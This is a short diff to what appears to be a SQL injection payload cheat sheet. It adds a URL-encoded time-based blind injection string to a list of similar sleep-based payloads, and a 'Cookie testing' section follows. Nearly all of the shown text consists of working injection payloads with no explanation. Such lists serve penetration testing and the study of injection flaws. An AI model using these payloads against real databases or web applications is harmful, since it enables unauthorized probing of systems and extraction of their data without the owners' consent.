@@ -95,6 +95,8 @@ or sleep(5)
 1'XOR(if(now()=sysdate(),sleep(3),0))OR' >> PATH
 
 (select*from(select(sleep(3)))a)
+
+(SELECT%20(CASE%20WHEN%20(1=1)%20THEN%20SLEEP(10)%20ELSE%202%20END))
 ```
 ### Cookie testing 
 ```sql
